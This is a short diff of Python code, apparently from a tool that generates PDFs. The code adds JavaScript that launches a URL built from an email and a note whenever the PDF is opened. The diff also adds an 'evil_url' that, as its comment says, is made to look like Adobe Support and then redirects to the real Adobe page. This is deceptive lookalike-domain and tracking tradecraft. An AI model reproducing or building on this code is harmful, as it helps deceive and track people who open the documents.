@@ -19,6 +19,10 @@ def generate_pdf(mail, note, name):
     for page in reader.pages:
         writer.add_page(page)
 
+
+    # This url looks kind of like Adobe Support and it redirects you to the actual Adobe Support.
+    evil_url = create_url(mail, note, "helpx.adobe/support/", "https://helpx.adobe.com/support/acrobat.html")
+    
     url = create_url(mail, note)
     writer.add_js(f"app.launchURL('{url}', true);")
 
